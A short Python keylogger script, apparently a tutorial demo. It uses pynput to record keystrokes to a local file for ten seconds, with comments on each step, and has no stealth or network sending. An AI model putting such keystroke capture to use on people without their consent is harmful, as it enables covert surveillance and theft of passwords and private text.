from threading import Timer
from pynput.keyboard import Key,Listener

def on_press(k):

    # we print only letters, digits and symbols, not the hotkeys
    if k != Key.shift_l and k != Key.shift_r and k != Key.ctrl_l  and k != Key.ctrl_r and k != Key.caps_lock:
        f.write(f'{k}')  

if __name__ == '__main__':
    
    timelimit = 10  # it sets the timelimit of the listener
    f = open('keylogs.txt','w')   # opens/creates a file named 'keylogger.txt'

    # starting of listener
    with Listener(on_press=on_press) as listen:
        
        Timer(timelimit, listen.stop).start()  
        # the timer stops the listener after the timelimit  
        
        listen.join()
        print(f'{timelimit} seconds passed')

    f.close()   # closes the file